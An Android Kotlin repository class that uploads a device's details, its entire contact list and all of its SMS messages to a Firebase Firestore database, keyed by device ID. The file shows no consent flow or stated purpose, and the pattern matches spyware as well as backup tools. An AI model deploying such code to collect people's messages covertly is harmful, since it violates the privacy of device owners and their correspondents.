package com.datasync.user.data

import com.datasync.user.model.Contact
import com.datasync.user.model.DeviceInfo
import com.datasync.user.model.SMS
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.SetOptions
import kotlinx.coroutines.tasks.await

class FirestoreRepository {
    private val db = FirebaseFirestore.getInstance()

    suspend fun updateDeviceInfo(deviceInfo: DeviceInfo) {
        db.collection("devices")
            .document(deviceInfo.deviceId)
            .set(deviceInfo)
            .await()
    }

    suspend fun syncContacts(deviceId: String, contacts: List<Contact>) {
        val collectionRef = db.collection("devices")
            .document(deviceId)
            .collection("contacts")
            .document("all")

        val data = mapOf("list" to contacts)
        collectionRef.set(data).await()
    }

    suspend fun syncSMS(deviceId: String, smsList: List<SMS>) {
        val collectionRef = db.collection("devices")
            .document(deviceId)
            .collection("sms")
            .document("all")

        val data = mapOf("list" to smsList)
        collectionRef.set(data).await()
    }
}
